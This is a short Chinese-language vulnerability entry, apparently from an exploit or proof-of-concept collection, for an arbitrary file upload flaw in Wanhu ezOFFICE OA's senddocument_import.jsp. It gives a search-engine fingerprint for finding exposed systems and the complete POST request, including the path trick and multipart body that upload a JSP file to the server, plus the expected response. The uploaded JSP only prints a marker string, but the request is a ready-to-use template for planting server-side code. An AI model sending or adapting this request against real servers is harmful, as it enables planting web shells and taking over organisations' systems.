# 万户OA-senddocument_import.jsp任意文件上传漏洞

- **系统**：万户OA-senddocument_import.jsp　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="万户网络-ezOFFICE"`
- **请求**：`POST /defaultroot/modules/govoffice/gov_documentmanager/senddocument_import.jsp;?categoryId=null&path=loginpage&mode=add&fileName=null&saveName=null&fileMaxSize=0&fileMaxNum=null&fileType=jsp HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----w80tipyzy4xm9y5cb2zk`

**请求体 / payload**
```
------w80tipyzy4xm9y5cb2zk
Content-Disposition: form-data; name="photo"; filename="dudesite.jsp"
Content-Type: application/octet-stream
<%out.println("dudesite");%>
------w80tipyzy4xm9y5cb2zk
Content-Disposition: form-data; name="continueUpload"
0
------w80tipyzy4xm9y5cb2zk
Content-Disposition: form-data; name="submit"
导 入
------w80tipyzy4xm9y5cb2zk--
```
- **预期**：200　|　dudesite.jsp